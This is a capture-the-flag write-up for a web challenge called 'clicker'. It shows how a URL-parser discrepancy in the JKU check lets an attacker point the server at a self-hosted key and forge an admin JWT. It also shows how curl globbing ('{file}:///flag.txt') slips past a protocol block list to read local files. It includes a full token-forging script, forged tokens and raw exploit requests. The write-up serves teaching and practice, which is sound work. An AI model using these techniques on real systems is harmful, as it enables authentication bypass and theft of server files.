## Web — clicker

Author: **lordrukie x beluga**

Im too addicted to this clicker game, so i decided to make it myself.

**TL;DR**

1. parser discrepancy allows forge jwt by injecting the jku header with our own key 
2. fetch flag using curl url globbing

**FLAG**

`C2C{p4rs3r_d1sr4p4ncy_4nd_curl_gl0bb1ng_1s_my_f4v0r1t3_58a57814ba55}}`

**Exploration**

flag is at `/flag.txt` 

run.sh:

```python
#!/bin/sh
rm ./run.sh Dockerfile docker-compose.yml
# Generate secrets
export SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
export FLAG=${GZCTF_FLAG:-C2C{fakeflag}}

echo $FLAG > /flag.txt

cd /app

python3 generate_keys.py

python3 app.py
```

the web app lets u register, then upon logging in theres a clicker game where u get a point for every click

![image.png](images/image%206.png)

looking at the source code, we know there are also admin only functionalities which require is_admin set to true

/routes/admin.py:

```python
@admin_bp.route('/api/admin/download', methods=['POST'])
@token_required
@admin_required
def download_file():
    data = request.get_json()
    url = data.get('url')
    filename = data.get('filename')
    title = data.get('title')
    file_type = data.get('type')
    
    <snip>
    try:
        output_path = os.path.join('static', filename)
        result = subprocess.run(['curl', '-o', output_path, '--', url], 
                              capture_output=True, text=True, timeout=30)
```

/routes/auth.py:

```python
payload = {
        'user_id': user['id'],
        'username': user['username'],
        'is_admin': bool(user['is_admin']),
        'exp': datetime.utcnow() + timedelta(hours=24),
        'jku': 'http://localhost:5000/jwks.json'
    }
```

we wanna try to be admin so we can use the download functionality to get the flag

first lets look for a way to forge the cookie n be admin 

here the app implement a jwt verification system using the jku header with a flow like so:

→ get the jwt 

→ looks at jku in the jwt header 

→ check local cache for key 

→ if cache empty, fetch key from jku_url 

→ key used to verify jwt

/utils/jwt_utils.py:

```python
import json
import jwt
import requests
import time
from urllib.parse import urlparse
from utils.url_parser import validate_jku_url

jwks_cache = {}
CACHE_TTL = 3600

def fetch_jwks(jku_url):
    try:
        if jku_url in jwks_cache:
            cached_data, cached_time = jwks_cache[jku_url]
            if time.time() - cached_time < CACHE_TTL:
                return cached_data
        
        if not validate_jku_url(jku_url):
            return None
        
        response = requests.get(jku_url, timeout=5, allow_redirects=False)
        
        if response.status_code != 200:
            return None
        
        content_type = response.headers.get('Content-Type', '')
        if content_type != 'application/json':
            return None
        
        if not response.url.endswith('jwks.json'):
            return None
        
        jwks_data = response.json()
        jwks_cache[jku_url] = (jwks_data, time.time())
        
        return jwks_data
    except Exception:
        return None

def verify_token(token):
    try:
        unverified = jwt.decode(token, options={"verify_signature": False})
        
        if 'jku' not in unverified:
            return None
        
        jku_url = unverified['jku']
        
        jwks_data = fetch_jwks(jku_url)
        if not jwks_data or 'keys' not in jwks_data:
            return None
        
        for key_data in jwks_data['keys']:
            try:
                public_key = jwt.algorithms.RSAAlgorithm.from_jwk(json.dumps(key_data))
                decoded = jwt.decode(token, public_key, algorithms=['RS256'])
                return decoded
            except:
                continue
        
        return None
    except Exception:
        return None
```

the idea here is to look for a way to control the jku_url so that it points to our own server where we can serve our own public key n forge the jwt

to do this we need to bypass the jku url validation where it only accept [`localhost`](http://localhost) and some ports

/utils/url_parser.py:

```python
def extract_domain(url):
    url_without_scheme = remove_scheme(url)
    domain_and_port = url_without_scheme.split('/')[0]
    
    if '@' in domain_and_port:
        parts = domain_and_port.split('@')
        domain_and_port = parts[1]
    
    return domain_and_port
    
def validate_jku_url(url):
    allowed_domains = ['localhost', '127.0.0.1']
    allowed_ports = ['80', '443', '5000', '8080']
```

since the jku url is fetched using requests, we can take advantage of how the domain is extracted

        `response = requests.get(jku_url, timeout=5, allow_redirects=False)`

<aside>
💡

the `requests` library treats the part before @ as user credentials

</aside>

so we can perform ssrf here by constructing a url like

 `http://user@localhost:5000@attacker.com/path`

- `extract_domain` will just check the part after `@` and take index 1 which is `localhost:5000` and this passes the validator
- meanwhile `requests` fetches `attacker.com` and treats `user@localhost:5000` as user credentials

this way we can pass the validator while also fetch our own url

to forge the cookie this script was created: 

```python
import json
import jwt
import requests
import time
import base64
import os
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# 1. Generate RSA Key Pair
print("[-] Generating RSA Keys...")
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_numbers = private_key.public_key().public_numbers()

def int_to_base64(n):
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
    return base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode('utf-8')

jwks_data = {
    "keys": [{
        "kty": "RSA", "kid": "key1", "use": "sig", "alg": "RS256",
        "n": int_to_base64(public_numbers.n),
        "e": int_to_base64(public_numbers.e)
    }]
}

# 2. Key Hosting Instructions 
print(json.dumps(jwks_data))

raw_url = input("Paste URL here: ").strip()

# Clean the input URL
if raw_url.startswith("https://"):
    scheme = "https"
    raw_url = raw_url[8:]
elif raw_url.startswith("http://"):
    scheme = "http"
    raw_url = raw_url[7:]
else:
    scheme = "http"

if '/' in raw_url:
    host_part, path_part = raw_url.split('/', 1)
    path_part = '/' + path_part
else:
    host_part = raw_url
    path_part = '/'

# Construct the bypass JKU
# The path must end with .jwks.json for the validator.
# We append ?.jwks.json as a query parameter so the server sees it, 
final_jku = f"{scheme}://user@localhost:5000@{host_part}{path_part}?.jwks.json"

print(f"\n[-] Constructed JKU: {final_jku}")

# 4. Forge Token
payload = {
    "user_id": 1337,
    "username": "admin",
    "is_admin": True,
    "exp": time.time() + 3600,
    "jku": final_jku 
}

headers = {
    "kid": "key1",
    "jku": final_jku
}

print("[-] Forging Admin Token...")
token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers=headers
)
print(f"[-] Forged Token: {token}")
```

this script will ask u to put in the jkws to be hosted in your server, for this i use webhook, make sure to change content type to application/json like so, then paste the webhook url to the script

![image.png](images/image%207.png)

the generated jwt can be used to access admin functionalities

![image.png](images/image%208.png)

we are now admin :D

https://everything.curl.dev/cmdline/urls/globbing.html

now to actually use the download functionality we need to bypass the protocol validator where it checks if the url starts with any of the protocol listed 

```python
@admin_bp.route('/api/admin/download', methods=['POST'])
@token_required
@admin_required
def download_file():
    data = request.get_json()
    url = data.get('url')
    filename = data.get('filename')
    title = data.get('title')
    file_type = data.get('type')
    
    if not url or not filename or not title:
        return jsonify({'message': 'URL, filename, and title required'}), 400
    
    # Make sure only http/s are allowed
    blocked_protocols = [
        'dict', 'file', 'ftp', 'ftps', 'gopher', 'gophers',
        'imap', 'imaps', 'ipfs', 'ipns', 'ldap', 'ldaps',
        'mqtt', 'pop3', 'pop3s', 'rtmp', 'rtsp', 'scp',
        'sftp', 'smb', 'smbs', 'smtp', 'smtps', 'telnet',
        'tftp', 'ws', 'wss',
    ]

    url_lower = url.lower().strip()

    for proto in blocked_protocols:
        if url_lower.startswith(proto) or (proto + ':') in url_lower:
            return jsonify({'message': f'Blocked protocol: {proto}'}), 400
    
    filename = secure_filename(filename)
    if not filename:
        return jsonify({'message': 'Invalid filename'}), 400
    
    try:
        output_path = os.path.join('static', filename)
        result = subprocess.run(['curl', '-o', output_path, '--', url], 
                              capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            file_size = os.path.getsize(output_path)
            if file_size > int(1.5 * 1024 * 1024):
                os.remove(output_path)
                return jsonify({'message': 'File too large (max 1.5MB)'}), 400
            
            file_path = f'/static/{filename}'
            
            db = get_db()
            db.execute('INSERT INTO files (title, filename, file_type, file_path) VALUES (?, ?, ?, ?)',
                      (title, filename, file_type, file_path))
            db.commit()
            db.close()
            
            return jsonify({
                'message': f'File downloaded successfully',
                'path': file_path,
                'type': file_type
            }), 200
        else:
            return jsonify({'message': 'Download failed', 'error': result.stderr}), 500
    except Exception as e:
        return jsonify({'message': 'Download failed', 'error': str(e)}), 500
```

since the download functionality uses curl, we can bypass it using url globbing

instead of passing `[file:///flag.txt](file:///flag.txt)` right away, we can pass `{file}:///flag.txt` → curl sees this as a list with one option (file) then fetches `file:///flag.txt`

<aside>
💡

in the context of curl, curly braces {} are used for url globbing → to generate a sequence of requests

for example,

to save the main pages of two different sites:

`curl "http://{one,two}.example.com" -o "file_#1.txt"`

</aside>

![image.png](images/image%209.png)

open the downloaded file to get flag: 

![image.png](images/image%2010.png)

**Exploitation steps to reproduce**

fully generated by ai, script to forge cookie:

```python
import json
import jwt
import requests
import time
import base64
import os
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# 1. Generate RSA Key Pair
print("[-] Generating RSA Keys...")
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_numbers = private_key.public_key().public_numbers()

def int_to_base64(n):
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
    return base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode('utf-8')

jwks_data = {
    "keys": [{
        "kty": "RSA", "kid": "key1", "use": "sig", "alg": "RS256",
        "n": int_to_base64(public_numbers.n),
        "e": int_to_base64(public_numbers.e)
    }]
}

# 2. Key Hosting Instructions 
print(json.dumps(jwks_data))

raw_url = input("Paste URL here: ").strip()

# Clean the input URL
if raw_url.startswith("https://"):
    scheme = "https"
    raw_url = raw_url[8:]
elif raw_url.startswith("http://"):
    scheme = "http"
    raw_url = raw_url[7:]
else:
    scheme = "http"

if '/' in raw_url:
    host_part, path_part = raw_url.split('/', 1)
    path_part = '/' + path_part
else:
    host_part = raw_url
    path_part = '/'

# Construct the bypass JKU
# The path must end with .jwks.json for the validator.
# We append ?.jwks.json as a query parameter so the server sees it, 
final_jku = f"{scheme}://user@localhost:5000@{host_part}{path_part}?.jwks.json"

print(f"\n[-] Constructed JKU: {final_jku}")

# 4. Forge Token
payload = {
    "user_id": 1337,
    "username": "admin",
    "is_admin": True,
    "exp": time.time() + 3600,
    "jku": final_jku 
}

headers = {
    "kid": "key1",
    "jku": final_jku
}

print("[-] Forging Admin Token...")
token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers=headers
)
print(f"[-] Forged Token: {token}")
```

output:

```python
[-] Generating RSA Keys...
{"keys": [{"kty": "RSA", "kid": "key1", "use": "sig", "alg": "RS256", "n": "kOFtc2_HNOLldqfFgsLBrlKTFubXu4oZEhWFgLbrzwbxHGK6SYrxs35CYpdRFD3wZyHcn3lOsYQEh2vUW2f5MsDuIy1omDt_qfM2Z2J-rYmjnalVTBd8AjyMvXrFGSbtIRNXBPsJ-88wCVuNimYGFXpZ1ZrmIWIg3Fao--dZEwRYcD4Q6pwrtopE4WnC_6H_4AxrZPzS5ls4tLajxqc1VH2-WLF2W6ZFo75Cne5u3JhIwsQ9LZ4iJU0AjhTFnwG0I1o_0nMsZFgB8iPBIbBYjFivx5O31oVkcLCWrOZErpRhOHZsF3R2BoL-lOFD1Qgp4DRsBlm9noJIzft5mY3JNQ", "e": "AQAB"}]}
Paste URL here:https://webhook.site/787bf253-2ee0-4137-a459-35c1199a0041

[-] Constructed JKU: https://user@localhost:5000@webhook.site/787bf253-2ee0-4137-a459-35c1199a0041?.jwks.json
[-] Forging Admin Token...
[-] Forged Token: eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vdXNlckBsb2NhbGhvc3Q6NTAwMEB3ZWJob29rLnNpdGUvNzg3YmYyNTMtMmVlMC00MTM3LWE0NTktMzVjMTE5OWEwMDQxPy5qd2tzLmpzb24iLCJraWQiOiJrZXkxIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMzM3LCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImV4cCI6MTc3MTMzMjY5NS4zMDk1MTEsImprdSI6Imh0dHBzOi8vdXNlckBsb2NhbGhvc3Q6NTAwMEB3ZWJob29rLnNpdGUvNzg3YmYyNTMtMmVlMC00MTM3LWE0NTktMzVjMTE5OWEwMDQxPy5qd2tzLmpzb24ifQ.VG-D7lcMs2Pe8dBn1Uvgus4JW7ZwR23FSCgFhdM3oLrKOVL7SeFcfkMnahGNYjeIWNApduUTZUKtnGu15145qsxD5bNsocxLP-uP1xYIKBUm2x_X0yD8cNZqSXY56hPKfBzqf-OZpxdvwfLclUblA5jVZspGxjFRbATGhTqHwzEjjKaUOvp3yyddhxXXJ8Uq2AtnSRM8k4rPcVQTMu2HK_CQNx54PwbO6wLBmbqyH7caClVQPSK7RuW1xYAAsoqjDA9_Ttx7Ht07HFE4yDLAxS4OUABnLHleyzM-A2jPQgBnOqrmFiXPNu_ZICmjr3AABzb9iEkjcWMU-wEuYtPsOA 
```

after getting the cookie, send post request like so:

```python
POST /api/admin/download HTTP/1.1
Host: challenges.1pc.tf:43331
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://challenges.1pc.tf:43331/
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vdXNlckBsb2NhbGhvc3Q6NTAwMEB3ZWJob29rLnNpdGUvNzg3YmYyNTMtMmVlMC00MTM3LWE0NTktMzVjMTE5OWEwMDQxPy5qd2tzLmpzb24iLCJraWQiOiJrZXkxIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMzM3LCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImV4cCI6MTc3MTMzMjMxNi42OTk3MTMsImprdSI6Imh0dHBzOi8vdXNlckBsb2NhbGhvc3Q6NTAwMEB3ZWJob29rLnNpdGUvNzg3YmYyNTMtMmVlMC00MTM3LWE0NTktMzVjMTE5OWEwMDQxPy5qd2tzLmpzb24ifQ.WP34Ji2leDA4fgdVnmdWhx55wN8QvZ1vUEE9UzAdokgBDBhnlwBHqEumu4y-zXztoqIiAwZB-dxlRF-9nKiC1R4TwFJQ9xoyTL1cXamtixMQNo4A1RKhjzoCkRpsWbJBt6VOEd62uvnDXhQgQwMZfTMs58-4GOXrTSBUBsHhhi73fnhDz61cOUlRxICPiB97p7eTB_P2ve49043bkr-A8VP5l_xuwMA9HVqG8swIbnllCNVm7e7mgRfge866kaz-7sJcjDI9IQ-ZxtGh9DYCv0FCubiFzgtj6wm8M1AYHx21dBrIjI2nylpXDgpxfC2tZ68b6A5g4Lqugy6fwKpZgA
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 110

{
    "url": "{file}:///flag.txt",
    "filename": "flag.txt",
    "title": "flag",
    "type": "image"
}
```

response:

```python
HTTP/1.1 200 OK
Server: Werkzeug/3.1.5 Python/3.11.14
Date: Tue, 17 Feb 2026 11:48:33 GMT
Content-Type: application/json
Content-Length: 84
Connection: close

{"message":"File downloaded successfully","path":"/static/flag.txt","type":"image"}
```

then send get request to obtain flag

```python
GET /static/flag.txt HTTP/1.1
Host: challenges.1pc.tf:43331
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://challenges.1pc.tf:43331/
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vdXNlckBsb2NhbGhvc3Q6NTAwMEB3ZWJob29rLnNpdGUvNzg3YmYyNTMtMmVlMC00MTM3LWE0NTktMzVjMTE5OWEwMDQxPy5qd2tzLmpzb24iLCJraWQiOiJrZXkxIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMzM3LCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImV4cCI6MTc3MTMzMjMxNi42OTk3MTMsImprdSI6Imh0dHBzOi8vdXNlckBsb2NhbGhvc3Q6NTAwMEB3ZWJob29rLnNpdGUvNzg3YmYyNTMtMmVlMC00MTM3LWE0NTktMzVjMTE5OWEwMDQxPy5qd2tzLmpzb24ifQ.WP34Ji2leDA4fgdVnmdWhx55wN8QvZ1vUEE9UzAdokgBDBhnlwBHqEumu4y-zXztoqIiAwZB-dxlRF-9nKiC1R4TwFJQ9xoyTL1cXamtixMQNo4A1RKhjzoCkRpsWbJBt6VOEd62uvnDXhQgQwMZfTMs58-4GOXrTSBUBsHhhi73fnhDz61cOUlRxICPiB97p7eTB_P2ve49043bkr-A8VP5l_xuwMA9HVqG8swIbnllCNVm7e7mgRfge866kaz-7sJcjDI9IQ-ZxtGh9DYCv0FCubiFzgtj6wm8M1AYHx21dBrIjI2nylpXDgpxfC2tZ68b6A5g4Lqugy6fwKpZgA
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

response:

```python
HTTP/1.1 200 OK
Server: Werkzeug/3.1.5 Python/3.11.14
Date: Tue, 17 Feb 2026 11:49:15 GMT
Content-Disposition: inline; filename=flag.txt
Content-Type: text/plain; charset=utf-8
Content-Length: 70
Last-Modified: Tue, 17 Feb 2026 11:48:33 GMT
Cache-Control: no-cache
ETag: "1771328913.2741008-70-1284638591"
Date: Tue, 17 Feb 2026 11:49:15 GMT
Connection: close

C2C{p4rs3r_d1sr4p4ncy_4nd_curl_gl0bb1ng_1s_my_f4v0r1t3_58a57814ba55}}
```